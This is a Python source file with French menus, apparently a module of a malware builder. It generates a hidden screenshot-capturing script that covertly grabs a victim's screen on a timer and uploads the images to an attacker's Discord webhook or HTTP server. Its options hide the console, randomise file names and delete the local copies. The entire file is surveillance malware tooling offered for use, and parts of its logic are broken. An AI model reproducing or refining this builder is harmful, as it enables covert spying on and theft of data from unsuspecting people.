import os
from colorama import Fore, Style, init
import time
import random

init(autoreset=True)

def clear():
    os.system("cls")

def affichage_screenshot():
    clear()
    print(Fore.CYAN + "=== Configuration Screenshot ===\n")
    print(f"""
{Fore.YELLOW}--- Fréquence & timing ---
{Fore.WHITE}
1.  Mode de capture (unique / périodique) (u/p)
2.  Intervalle de capture (secondes / random)
3.  Nombre maximum de captures
4.  Délai avant première capture

{Fore.YELLOW}--- Stockage ---
{Fore.WHITE}
5. Sauvegarde locale (chemin)
{Fore.YELLOW}--- Envoi ---
{Fore.WHITE}
6. Envoi sur Discord
7. Envoi sur serveur HTTP

{Fore.YELLOW}--- Furtivité ---
{Fore.WHITE}
8. Masquer la console
9. Nom de fichier aléatoire
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
""")
    
def screenshot_module():
    clear()
    affichage_screenshot()
    choix = {
        "Intervalle de capture": 300,
        "Nombre maximum de captures": 1,
        "Délai avant première capture": 0,
        "Sauvegarde locale": None,
        "Envoi sur Discord": None,
        "Envoi sur serveur HTTP": None,
        "Mode de capture": 1,
        "Masquer la console": None,
        "Nom de fichier aléatoire": None,
    }

    def mode_capture_option():
        clear()
        mode = input("Entrez le mode de capture (unique / périodique) (u/p): ")
        choix["Mode de capture"] = mode
        affichage_screenshot()
        if mode.lower() == "p":
            clear()
            mode = input("Entrez l'intervalle d'envoi de captures (en nombre de captures) : ")
            choix["Mode de capture"] = mode
            affichage_screenshot()
        elif mode.lower() == "u":
            choix["Mode de capture"] = 1
            affichage_screenshot()
        

    def intervalle_capture_option():
        clear()
        intervalle = input("Entrez l'intervalle de capture en secondes ('random' pour aléatoire) (5 minutes par défaut): ")
        choix["Intervalle de capture"] = intervalle
        affichage_screenshot()

    def nombre_max_captures_option():
        clear()
        nombre = input("Entrez le nombre maximum de captures : ")
        choix["Nombre maximum de captures"] = int(nombre)
        affichage_screenshot()

    def delai_premiere_capture_option():
        clear()
        delai = input("Entrez le délai avant la première capture en secondes : ")
        choix["Délai avant première capture"] = int(delai)
        affichage_screenshot()

    def sauvegarde_locale_option():
        clear()
        print("Si activé, pour recevoir les captures vous allez devoir configurer un serveur HTTP ou un webhook Discord. et parametrer les options d'envoi.\n\n")
        chemin = input("Entrez le chemin de sauvegarde locale (C:/path/to/save/): ")
        choix["Sauvegarde locale"] = chemin
        affichage_screenshot()

    def envoi_discord_option():
        clear()
        discord = input("Entrez l'URL du webhook Discord : ")
        choix["Envoi sur Discord"] = discord
        affichage_screenshot()

    def envoi_http_option():
        clear()
        http = input("Entrez l'URL du serveur HTTP : ")
        choix["Envoi sur serveur HTTP"] = http
        affichage_screenshot()

    def activer_logs_option():
        clear()
        logs = input("Activer les logs ? (oui/non) : ")
        if logs.lower() == "oui":
            choix["Activer logs"] = True
        else:
            choix["Activer logs"] = None
        affichage_screenshot()

    def masquer_console_option():
        clear()
        masquer = input("Masquer la console ? (oui/non) : ")
        if masquer.lower() == "oui":
            choix["Masquer la console"] = ".pyw"
        else:
            choix["Masquer la console"] = ".py"
        affichage_screenshot()

    def nom_fichier_aleatoire_option():
        clear()
        aleatoire = input("Nom de fichier aléatoire ? (oui/non) : ")
        if aleatoire.lower() == "oui":
            choix["Nom de fichier aléatoire"] = f"_{random.randint(1000,9999)}.py"
        else:
            clear()
            aleatoire = input("Entrez le nom du fichier")
            choix["Nom de fichier aléatoire"] = aleatoire
        affichage_screenshot()

    def controle():
        if choix["Envoi sur Discord"] and choix["Envoi sur serveur HTTP"]:
            print(Fore.RED + "Erreur : Choisissez un seul mode d'envoi (Discord ou HTTP)." + Style.RESET_ALL)
            time.sleep(2)
            choix["Envoi sur Discord"] = None
            choix["Envoi sur serveur HTTP"] = None
        else:
            return True
        if not choix["Envoi sur Discord"] and not choix["Envoi sur serveur HTTP"]:
            print(Fore.RED + "Erreur : Vous devez choisir au moins un mode d'envoi (Discord ou HTTP)." + Style.RESET_ALL)
            time.sleep(2)
            return False
        if not choix["Nom de fichier aléatoire"]:
            print(Fore.RED + "Erreur : Vous devez définir un nom de fichier." + Style.RESET_ALL)
            time.sleep(2)
            return False
        if not choix["Masquer la console"]:
            print(Fore.RED + "Erreur : Vous devez définir si la console doit être masquée ou non." + Style.RESET_ALL)
            time.sleep(2)
            return False
        affichage_screenshot()
        

    def create_payload():
        clear()
        print(Fore.GREEN + "Création du payload Screenshot avec la configuration suivante :" + Style.RESET_ALL)
        filename = f"s{choix['Nom de fichier aléatoire']}{choix['Masquer la console']}"
        
        sauvegarde_code = ""

        if choix["Sauvegarde locale"]:
            sauvegarde_code += f"""
            if not os.path.exists(r"{choix['Sauvegarde locale']}"):
                os.makedirs(r"{choix['Sauvegarde locale']}", exist_ok=True)

            filepath = os.path.join(
                r"{choix['Sauvegarde locale']}",
                f"screenshot_{int(time.time())}.png"
            )

            image.save(filepath)
            captures.append(filepath)

        """    

        mode_envoi = choix.get("Mode envoi")

        if mode_envoi is None:
            condition_envoi = "True"   # sécurité : envoi à chaque capture
        else:
            condition_envoi = f"_ % {mode_envoi} == 0 and _ != 0"

        envoi_code = ""

        if choix["Envoi sur Discord"]:
            envoi_code += f"""
            files = {{'file': ('screenshot.png', buffer, 'image/png')}}
            requests.post("{choix['Envoi sur Discord']}", files=files)
        """

        if choix["Envoi sur serveur HTTP"]:
            envoi_code += f"""
            files = {{'file': ('screenshot.png', buffer, 'image/png')}}
            requests.post("{choix['Envoi sur serveur HTTP']}", files=files)
        """

        if envoi_code:
            sauvegarde_code += f"""
        if {condition_envoi}:
            buffer.seek(0)
{envoi_code}
        """


        if choix["Mode de capture"]:
            sauvegarde_code += f"""
            if _ % {choix['Mode de capture']} == 0 and _ != 0:
                buffer.seek(0)
                {"# Envoi sur Discord" if choix['Envoi sur Discord'] else ""}
                {"files = {'file': ('screenshot.png', buffer, 'image/png')}" if choix['Envoi sur Discord'] else ""}
                {"requests.post('" + choix['Envoi sur Discord'] + "', files=files)" if choix['Envoi sur Discord'] else ""}
                {"# Envoi sur serveur HTTP" if choix['Envoi sur serveur HTTP'] else ""}
                {"files = {'file': ('screenshot.png', buffer, 'image/png')}" if choix['Envoi sur serveur HTTP'] else ""}
                {"requests.post('" + choix['Envoi sur serveur HTTP'] + "', files=files)" if choix['Envoi sur serveur HTTP'] else ""}
            os.remove(os.path.join(r"{choix['Sauvegarde locale']}", f"screenshot_{{int(time.time())}}.png"))
            """
            

        
            


        code = f"""
import time
import os
from PIL import ImageGrab
import requests
import random
import io

def take_screenshot():
    captures = {choix['Mode de capture']}
    try:
        time.sleep({choix['Délai avant première capture']})
        for _ in range({choix['Nombre maximum de captures']}):
            image = ImageGrab.grab()
            buffer = io.BytesIO()
            image.save(buffer, format="PNG")
            buffer.seek(0)
{sauvegarde_code}

        if "{choix['Mode de capture']}" == 1:
            for path in captures:
                with open(path, "rb") as img:
                    requests.post("{choix['Envoi sur Discord'] or choix['Envoi sur serveur HTTP']}", files={"file": img})
                os.remove(path)
            captures.clear()

        if "{choix['Mode de capture']}" == "p":
            if len(captures) >= {choix['Mode envoi']}:
                for path in captures:
                    with open(path, "rb") as img:
                        requests.post("{choix['Envoi sur Discord'] or choix['Envoi sur serveur HTTP']}", files={"file": img})
                    os.remove(path)
                captures.clear()

        time.sleep({choix['Intervalle de capture']})
    except Exception as e:
        print(f"Erreur lors de la capture d'ecran : {{e}}")
        return None

take_screenshot()
"""
        
        with open(f"Option/modules/payload/payload_created/{filename}", "w") as f:
            f.write(code)
        
        print(Fore.GREEN + f"Payload créé : {filename}" + Style.RESET_ALL)

    while True:
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)
        if cmd.lower() == "exit":
            break
        if cmd.lower().startswith("set"):
            try:
                option_num = int(cmd.split()[1])
                if option_num in range(1, 11):
                    option_funcs = {
                        1: mode_capture_option,
                        2: intervalle_capture_option,
                        3: nombre_max_captures_option,
                        4: delai_premiere_capture_option,
                        5: sauvegarde_locale_option,
                        6: envoi_discord_option,
                        7: envoi_http_option,
                        8: masquer_console_option,
                        9: nom_fichier_aleatoire_option,
                    }
                    option_funcs[option_num]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)

        if cmd.lower() == "show":
            clear()
            print("\nConfiguration actuelle du module Screenshot :")
            for key, value in choix.items():
                print(f"{key}: {value}")

        if cmd.lower() == "create":
            controle()
            create_payload()
            break
